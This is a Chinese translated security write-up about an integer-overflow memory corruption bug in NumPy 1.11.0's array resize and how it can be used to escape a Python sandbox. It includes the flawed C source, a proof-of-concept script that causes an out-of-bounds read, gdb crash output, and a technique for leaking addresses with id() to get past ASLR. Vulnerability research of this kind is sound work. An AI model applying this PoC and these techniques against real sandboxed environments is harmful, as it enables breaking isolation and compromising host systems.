# 【技术分享】利用内存破坏漏洞实现 Python 沙盒逃逸
|
##### 译文声明
本文是翻译文章，文章来源：hackernoon.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
作者：[beswing](http://bobao.360.cn/member/contribute?uid=820455891)
预估稿费：200RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
索性跳过了文作者的自述，我们直接进入到技术细节吧~
Python环境使用自定义白名单/黑名单方案来阻止访问危险的内置函数，模块，函数等。基于操作系统的隔离提供了一些额外的保护（虽然可能有些过时）。
打破锁定的Python解释器不是一个100％的胜利，但它使攻击者能够威胁到操作系统本身。
作者，是这么认为的，Python模块通常是包装后的C代码，那么我们是否能发现内存被恶意篡改或者利用内存破坏的漏洞来实现Python沙盒的逃逸？
那么，我们该从哪入手。 我知道在Python]沙箱中只能import白名单中的Python模块。 也许我应该运行一个分布式的AFL fuzzer网络？
还是一个符号执行引擎？ 或者也许我应该用最先进的静态分析工具扫描它们？ 当然，我可以做任何这些事情。
或者我可以跟踪一些曾经出现的bug，来查询是否有仍有可利用的存在。
在作者通过手动代码的审查和测试中，发现了一个Pyhon沙盒白名单的模块的一个可以用的内存破坏漏洞。这个bug，存在于Numpy模块。这是一个一个用python实现的科学计算包。包括：1、一个强大的N维数组对象Array；2、比较成熟的（广播）函数库；3、用于整合C/C++和Fortran代码的工具包；4、实用的线性代数、傅里叶变换和随机数生成函数。numpy和稀疏矩阵运算包scipy配合使用更加方便。
NumPy（Numeric
Python）提供了许多高级的数值编程工具，如：矩阵数据类型、矢量处理，以及精密的运算库。专为进行严格的数字处理而产生。多为很多大型金融公司使用，以及核心的科学计算组织如：Lawrence
Livermore，NASA用其处理一些本来使用C++，Fortran或Matlab等所做的任务。
如果要从Numpy作为入手，那么我先来分析源码，首先作者查看了代码的行数：
    $ cloc * 520 text files. 516 unique files. 43 files ignored.http://cloc.sourceforge.net v 1.60 T=2.42 s (196.7 files/s, 193345.0 lines/s) — — — — — — — — — — — — — — — — — — — —Language files blank comment code — — — — — — — — — — — — — — — — — — — — C 68 36146 70025 170992Python 311 27718 57961 87081C/C++ Header 82 1778 2887 7847Cython 1 947 2556 1627Fortran 90 10 52 12 136Fortran 77 3 2 1 83make 1 15 19 62 — — — — — — — — — — — — — — — — — — — — SUM: 476 66658 133461 267828
近20万行的C代码。而且这里存在一些bug。在这篇文章的其余部分，我首先描述导致这个漏洞的条件。
接下来，我讨论一些使用开发人员应该意识到的CPython运行时的行为，然后我将逐步了解实际的漏洞。
最后，我将思考量化在Python应用程序中的内存损坏问题的风险。
**The Vulnerability**
我将要通过的漏洞是Numpy v1.11.0（也许是旧版本）的整数溢出错误。
自v1.12.0以来，该问题已经解决，但没有发布安全咨询。该漏洞驻留在用于调整Numpy的多维数组类对象（ ndarray和friends）的API中。
调用resize调用定义数组形状的元组，其中元组的每个元素都是维的大小。
        $ python
        >>> import numpy as np
        >>> arr = np.ndarray((2, 2), ‘int32’)
        >>> arr.resize((2, 3))
        >>> arrarray([[-895628408, 32603, -895628408],[ 32603, 0, 0]], dtype=int32)
Sidenote：嗯，数组正在泄漏未初始化的内存，但是我们不会专注于这个post。
在覆盖下，resize实际上的realloc缓冲区，其大小计算为形状元组和元素大小中每个元素的乘积。 所以在前面的代码片段中，arr.resize((2,
3))归结为C代码realloc(buffer, 2 * 3 * sizeof(int32))。 下一个代码片段是C中resize实现。
    NPY_NO_EXPORT PyObject *
    PyArray_Resize(PyArrayObject *self, PyArray_Dims *newshape, int refcheck,
            NPY_ORDER order)
    {
        // npy_intp is `long long`
        npy_intp* new_dimensions = newshape->ptr;
        npy_intp newsize = 1;
        int new_nd = newshape->len;
        int k;
        // NPY_MAX_INTP is MAX_LONGLONG (0x7fffffffffffffff)
        npy_intp largest = NPY_MAX_INTP / PyArray_DESCR(self)->elsize;
        for(k = 0; k  largest) {
                return PyErr_NoMemory();
            }
        }
        if (newsize == 0) {
            sd = PyArray_DESCR(self)->elsize;
        }
        else {
            sd = newsize*PyArray_DESCR(self)->elsize;
        }
        /* Reallocate space if needed */
        new_data = realloc(PyArray_DATA(self), sd);
        if (new_data == NULL) {
            PyErr_SetString(PyExc_MemoryError,
                    "cannot allocate memory for array”);
            return NULL;
        }
        ((PyArrayObject_fields *)self)->data = new_data;
我们可以在代码段中找到漏洞。 您可以在for循环（第13行）中看到每个维度相乘以产生新的大小。
稍后（第25行），将新大小和元素大小的乘积作为大小传递给保存数组的realloc内存。
在realloc之前有一些关于新大小的验证，但是它不会检查整数溢出，这意味着非常大的维度可能导致分配的大小不足的数组。最终，这给攻击者一个强大的攻击途径：通过从具有overflown大小的数组进行索引来读取或写入任意内存的能力。
我们写一个Poc来验证漏洞：
    $ cat poc.py
    import numpy as np
    arr = np.array('A'*0x100)
    arr.resize(0x1000, 0x100000000000001)
    print "bytes allocated for entire array:    " + hex(arr.nbytes) 
    print "max # of elemenets for inner array:  " + hex(arr[0].size)
    print "size of each element in inner array: " + hex(arr[0].itemsize) 
    arr[0][10000000000]
    $ python poc.py
    bytes allocated for entire array:    0x100000
    max # of elemenets for inner array:  0x100000000000001
    size of each element in inner array: 0x100
    [1]    2517 segmentation fault (core dumped)  python poc.py
    $ gdb `which python` core
    ...
    Program terminated with signal SIGSEGV, Segmentation fault.
    (gdb) bt
    #0 0x00007f20a5b044f0 in PyArray_Scalar (data=0x8174ae95f010, descr=0x7f20a2fb5870, 
     base=) at numpy/core/src/multiarray/scalarapi.c:651
    #1 0x00007f20a5add45c in array_subscript (self=0x7f20a7870a80, op=)
     at numpy/core/src/multiarray/mapping.c:1619
    #2 0x00000000004ca345 in PyEval_EvalFrameEx () at ../Python/ceval.c:1539…
    (gdb) x/i $pc
    => 0x7f20a5b044f0 : cmpb $0x0,(%rcx)
    (gdb) x/g $rcx
    0x8174ae95f10f: Cannot access memory at address 0x8174ae95f10f
    CPython运行时的quirks
在编写漏洞的利用脚本之前。想讨论一些CPython运行时可以轻松利用漏洞的方法，同时也讨论了如何使漏洞利用开发人员受挫。
如果您想直接进入漏洞利用，请随意跳过本节。
**泄漏内存地址**
通常情况下，首要苦难之一就是绕过地址空间布局随机化（ASLR）。 幸运的是，对于攻击者来说，Python使得这很容易。
内置的id函数返回对象的内存地址，或者更准确地说，封装对象的PyObject结构的地址。
    $ gdb -q — arg /usr/bin/python2.7 (gdb) run -i 
    …
     >>> a = ‘A’*0x100 
     >>> b = ‘B’*0x100000 
     >>> import numpy as np 
     >>> c = np.ndarray((10, 10)) 
     >>> hex(id(a)) 
     ‘0x7ffff7f65848’ 
     >>> hex(id(b))
      ‘0xa52cd0’ 
     >>> hex(id(c))
      ‘0x7ffff7e777b0’
实际上在应用程序中，开发人员应确保不向用户公开id(object) 。 在沙盒化的环境中，除了可以将列表id或重新实现id以返回哈希之外，还可以做很多事情。
**了解内存分配行为**
了解您的分配器对于编写漏洞利用脚本至关重要。 Python具有基于对象类型和大小的不同分配策略。